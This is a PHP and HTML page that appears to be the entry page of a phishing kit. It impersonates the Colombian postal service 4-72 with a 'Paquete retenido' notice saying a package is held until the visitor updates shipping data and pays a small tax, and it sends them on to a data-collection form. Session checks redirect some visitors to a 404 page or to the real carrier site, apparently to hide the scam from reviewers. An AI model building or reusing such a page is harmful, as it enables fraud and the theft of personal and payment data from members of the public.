<?php


session_start();

if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Envios seguros</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    <link rel="stylesheet" href="css/style.css">

    <style>
        *{
            margin: 0;
            padding: 0;
        }
    </style>
</head>
<body>

<center><br><br><img src="img/logo.jpeg" alt="" srcset="" width="50%"></center>
<br><br><br><br>
<div class="informacion">
    <p class="title">Paquete retenido</p>
  <div style="width:80%; margin:auto;">
<br>
    <a>Su paquete con guía de rastreo No. 8965435. <br> Se encuentra retenido. <br><br>Para liberarlo debe actualizar sus datos de envio y realizar el pago de impuestos al IVA por un valor de: $8.689 COP</a><br><br>

    <form action="/actualizar_datos.php" method="post">
   <center> <input type="submit" value="Continuar" id="btn"></center>
   </form>

</div>
</div>
<br><br><br><br><br><br><br><br>
<br>


<!-- 

<footer>
    <div>
    <img src="/img/f1.jpg" alt="" srcset="" width="100%">
    <img src="/img/f2.jpg" alt="" srcset="" width="100%">
    <img src="/img/f3.jpg" alt="" srcset="" width="100%">
    <img src="/img/f4.jpg" alt="" srcset="" width="100%">
    <img src="/img/f5.jpg" alt="" srcset="" width="100%">
    </div>
    </footer>  -->
    

    <div class="footer" style="position:absolute; bottom:0;">
    <img src="/img/footer.jpg" alt="" srcset="" width="100%">
    </div>
</body>
</html>